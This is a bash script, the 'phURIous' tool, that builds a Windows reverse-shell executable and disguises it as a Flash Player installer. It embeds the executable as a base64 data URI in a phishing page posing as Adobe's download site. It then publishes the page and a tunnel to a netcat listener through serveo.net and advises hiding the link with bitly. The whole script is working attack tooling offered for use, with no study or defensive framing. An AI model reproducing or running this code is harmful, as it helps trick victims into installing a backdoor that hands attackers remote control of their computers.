#!/bin/bash
# phURIous v1.0
# coded by: @linux_choice
# github.com/thelinuxchoice/phurious
# If you use any part from this code, giving me the credits. Read the Lincense!

trap 'printf "\n";stop' 2

banner() {



printf "         \e[0m\e[1;31m______\e[0m\e[1;93m _____  _________________                     \e[0m\n"
printf " \e[1;31m___________  /\e[0m\e[1;93m___  / / /__  __ \___  _/\e[0m\e[1;77m_________  _________ \e[0m\n"
printf " \e[1;31m___  __ \_  __ \ \e[0m\e[1;93m / / /__  /_/ /__  /\e[0m\e[1;77m _  __ \  / / /_  ___/ \e[0m\n"
printf " \e[1;31m__  /_/ /  / / /\e[0m\e[1;93m /_/ / _  _, _/__/ /\e[0m\e[1;77m  / /_/ / /_/ /_(__  )  \e[0m\n"
printf " \e[1;31m_  .___//_/ /_/\e[0m\e[1;93m\____/  /_/ |_| /___/\e[0m\e[1;77m  \____/\__,_/ /____/   \e[0m\n"
printf " \e[1;31m/_/\e[0m                                                         \e[0m\n"
printf "\n"
printf " \e[1;77mv1.0 coded by @linux_choice\n"
printf " \e[1;77mgithub.com/thelinuxchoice/phurious\e[0m\n"

printf "\n"



}

stop() {

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1

}

dependencies() {

command -v base64 > /dev/null 2>&1 || { echo >&2 "I require base64 but it's not installed. Install it. Aborting."; exit 1; }
command -v zip > /dev/null 2>&1 || { echo >&2 "I require MSFVenom but it's not installed. Install it. Aborting."; exit 1; }
command -v netcat > /dev/null 2>&1 || { echo >&2 "I require netcat but it's not installed. Install it. Aborting."; exit 1; }
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; } 
command -v i686-w64-mingw32-gcc > /dev/null 2>&1 || { echo >&2 "I require mingw-w64 but it's not installed. Install it: apt-get update && apt-get install mingw-w64"; 
exit 1; }

}


server() {


printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"

if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi

if [[ $subdomain_resp == true ]]; then

$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net -R '$default_port1':localhost:4444 2> /dev/null > sendlink ' &
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m]\e[0m\e[1;31m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $default_port1
sleep 8
else
$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net -R '$default_port1':localhost:4444 2> /dev/null > sendlink ' &
printf "\e[1;77m[\e[0m\e[1;31m+\e[0m\e[1;77m]\e[0m\e[1;31m TCP Forwarding:\e[0m\e[1;77m serveo.net:%s/\e[0m\n" $default_port1
fi
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
fuser -k 3333/tcp > /dev/null 2>&1
php -S localhost:3333 > /dev/null 2>&1 &
sleep 4
send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' $send_link
printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Obfuscation URL use bitly.com (insert above link without https)\e[0m\n'


}


listener() {

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Listening connection:\e[0m\n"
nc -lvp 4444
}

payload() {

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building malware binary\e[0m\n"

sed 's+serveo_port+'$default_port1'+g'  source.c > rs.c
i686-w64-mingw32-gcc rs.c -o $payload_name.exe

if [[ -e $payload_name.exe ]]; then

zip $payload_name.zip $payload_name.exe > /dev/null 2>&1
IFS=$'\n'
data_base64=$(base64 -w 0 $payload_name.zip)
temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Converting binary to base64\e[0m\n" 
printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Injecting Data URI code into index.html\e[0m\n"
sed 's+url_website+'$url'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index.html
server
listener

else
printf "\e[1;93mError compiling\e[0m\n"
fi

}

start() {
default_port1=$(seq 1111 4444 | sort -R | head -n1)
default_payload_name="flashplayer_install"
default_url="https://get.adobe.com/flashplayer/download"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Payload name (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_payload_name

read payload_name
payload_name="${payload_name:-${default_payload_name}}"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Phishing URL (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_url
read url
url="${url:-${default_url}}"

printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Serveo (Forwarding) Port (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_port1
read ddefault_port1
ddefault_port1="${ddefault_port1:-${default_port1}}"
default_choose_sub="Y"
default_subdomain="flashinstaller$RANDOM"
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
read choose_sub
choose_sub="${choose_sub:-${default_choose_sub}}"
if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
subdomain_resp=true
printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
read subdomain
subdomain="${subdomain:-${default_subdomain}}"
fi


payload

}
banner
dependencies
start

